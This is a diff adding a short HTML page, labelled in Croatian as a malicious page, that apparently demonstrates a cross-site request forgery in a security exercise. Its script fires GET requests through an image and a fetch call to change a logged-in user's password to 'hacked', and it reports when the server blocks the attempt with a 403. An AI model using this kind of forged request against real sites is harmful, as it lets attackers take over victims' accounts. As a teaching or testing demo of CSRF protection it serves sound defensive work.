@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zlonamjerna stranica</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <form method="POST" action="/logout">
+    <button type="submit">Odjava</button>
+  </form>
+  <p>Zlonamjerna slika je pokušala promijeniti lozinku!</p>
+  <script>
+    var img = new Image();
+    img.src = '/update-password?password_new=hacked&password_conf=hacked';
+    
+    fetch('/update-password?password_new=hacked&password_conf=hacked', { method: 'GET' })
+      .then(response => {
+        if (response.status === 403) {
+          alert("Ovaj pokušaj promjene lozinke je blokiran zbog sigurnosnih razloga!");
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+  </script>
+  
+</body>
+</html>
